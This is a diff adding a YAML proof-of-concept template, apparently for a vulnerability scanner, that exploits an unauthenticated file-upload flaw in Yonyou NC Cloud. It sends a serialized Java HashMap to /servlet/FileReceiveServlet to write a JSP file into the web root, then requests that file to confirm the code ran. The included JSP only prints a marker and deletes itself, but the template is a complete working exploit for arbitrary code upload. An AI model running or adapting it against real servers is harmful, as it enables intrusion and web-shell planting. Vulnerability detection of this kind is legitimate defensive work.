@@ -1,0 +1,33 @@
+name: yaml-poc-yonyou-yonyou_nc_cloud-file_upload-CT-158899
+binding: 24fcfd66-22de-434e-9016-ab7b2133c3ae
+detail:
+    author: system_user
+    vulnerability:
+        id: 689d7e3e-2451-4dba-baa6-b924e0ab85f7
+        level: critical
+    warning: File Upload (Auto Clear)
+transport: http
+set:
+    r1: randomInt(10000, 20000)
+    r2: randomInt(1000000000, 2000000000)
+    r3: b"\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\a\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\fw\b\x00\x00\x00\x10\x00\x00\x00\x02t\x00\tFILE_NAMEt\x00\t"
+    r4: b".jspt\x00\x10TARGET_FILE_PATHt\x00\x10./webapps/nc_webx"
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /servlet/FileReceiveServlet
+            headers:
+                Content-Type: multipart/form-data;
+            body: '{{r3}}{{r1}}{{r4}}<%out.print("{{r2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>'
+        expression: response.status == 200
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /{{r1}}.jsp
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r2)))
+expression: r0() && r1()
